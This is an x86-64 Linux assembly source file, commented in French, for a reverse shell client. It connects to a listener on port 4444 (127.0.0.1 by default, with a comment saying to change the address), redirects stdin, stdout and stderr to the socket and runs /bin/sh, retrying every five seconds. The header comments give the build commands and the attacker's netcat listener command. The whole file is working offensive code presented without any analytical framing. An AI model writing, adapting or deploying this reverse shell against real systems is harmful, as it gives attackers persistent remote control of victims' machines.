; Assemble: nasm -f elf64 client.asm -o client.o && ld client.o -o client
; attacker side : nc -lvp 4444

global _start

section .text

_start:
retry:

    ;---  socket  ---

    mov rdi, 2          ; Famille
    mov rsi, 1          ; type_stream
    mov rdx, 6          ; protocol
    mov rax, 41
    syscall
    mov r8, rax         ; sauvegarde du socket fd



    ;---  Préparation de l'adresse  ---

    sub rsp, 16

    mov word [rsp], 2             ; Famille
    mov word [rsp+2], 0x5c11 	  ; Port 4444
    mov dword [rsp+4], 0x0100007F ; Adresse => modifier si autre que 127.0.0.1



    ;---  connect  ---

    mov rdi, r8
    mov rsi, rsp
    mov rdx, 16
    mov rax, 42
    syscall
    test rax, rax
    js wait_and_retry

.suite:

    ;---  call de dup2  ---

    mov rsi, 0

.dup_loop:
    mov rax, 33
    mov rdi, r8
    syscall
    inc rsi
    cmp rsi, 3
    jl .dup_loop


    ;---  execution du shell ---

execve_call:
    xor rax, rax
    push rax 
    mov rbx, 0x68732f6e69622f2f
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 59
    syscall


wait_and_retry:

    ;---  call close(socket_fd)  ---

    mov rax, 3         ; syscall: close
    mov rdi, r8
    syscall

    ;---  call nanosleep  ---

    sub rsp, 16
    mov qword [rsp], 5
    mov qword [rsp+8], 0

    mov rdi, rsp         ; const struct timespec *req
    xor rsi, rsi         ; NULL for remaining time
    mov rax, 35          ; syscall: nanosleep
    syscall

    add rsp, 16          ; clean sleep
    add rsp, 16          ; clean de l'adresse

    jmp retry
